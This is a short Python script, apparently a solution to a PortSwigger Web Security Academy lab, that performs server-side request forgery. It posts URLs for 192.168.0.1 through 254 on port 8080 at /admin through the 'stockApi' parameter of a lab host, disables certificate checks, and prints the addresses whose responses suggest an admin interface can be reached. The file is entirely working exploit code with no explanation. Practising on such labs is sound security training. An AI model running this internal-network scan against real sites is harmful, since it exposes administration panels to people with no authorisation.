import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

headers = {'Content-Type': 'application/x-www-form-urlencoded'}

for i in range(1, 255):
    data = {
        'stockApi': f"http://192.168.0.{i}:8080/admin"
        # 'stockApi': f"http://192.168.0.1:8080/product/stock/check?productId=3&storeId=2"
    }

    r = requests.post(
        "https://0a2a006b03e5d93b803199600011005f.web-security-academy.net/product/stock",
        data=data,
        headers=headers,
        verify=False,
        # proxies=proxies
    )
    if r.status_code != 400 and r.status_code != 500:
        print(i)

